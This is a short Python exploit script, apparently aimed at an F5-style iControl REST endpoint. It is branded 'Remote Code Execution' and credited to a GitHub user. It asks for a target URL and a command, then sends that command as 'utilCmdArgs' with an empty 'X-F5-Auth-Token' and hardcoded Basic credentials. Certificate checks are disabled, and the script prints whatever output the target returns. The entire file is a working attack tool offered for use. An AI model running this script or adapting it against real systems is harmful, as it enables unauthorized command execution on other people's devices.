import requests
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print(
    """
    
                             ____                      _          ____          _      
                            |  _ \ ___ _ __ ___   ___ | |_ ___   / ___|___   __| | ___ 
                            | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ | |   / _ \ / _` |/ _ |
                            |  _ <  __/ | | | | | (_) | ||  __/ | |__| (_) | (_| |  __/
                            |_| \_\___|_| |_| |_|\___/ \__\___|  \____\___/ \__,_|\___|
                                                                               
                             _____                     _   _               ~>Remote Code Execution<~
                            | ____|_  _____  ___ _   _| |_(_) ___  _ __   ~~>Made by tfwcodes(github)<~~
                            |  _| \ \/ / _ \/ __| | | | __| |/ _ \| '_ \ 
                            | |___ >  <  __/ (__| |_| | |_| | (_) | | | |
                            |_____/_/\_\___|\___|\__,_|\__|_|\___/|_| |_|
                                             
                            
    
    """
)

def check_url(url):
    try:
        s2 = requests.session()
        s2.get(url)
        print("[INFO] The target url is valid")
    except:
        print("[INFO] The target url is invalid")
        input()
        exit()

def attack(url, command):
    headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Content-Type': 'application/json',
            'X-F5-Auth-Token': '',
            'Authorization': 'Basic YWRtaW46QVNhc1M='
    }

    data = json.dumps({'command' : 'run', 'utilCmdArgs' : '-c' + command})

    s = requests.session()
    r = s.post(url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[ATTACK] The target is vulnerable")

        response_from_target = r.text
        print("[ATTACK] response from the target: " + "\n" + "{}".format(response_from_target))
    else:
        print("[ATTACK] The target is not vulnerable")


url_rce = input("[+] Enter the target url: ")
check_url(url_rce)

command_rce = input("[+] Enter the command to execute: ")
attack(url_rce, command_rce)
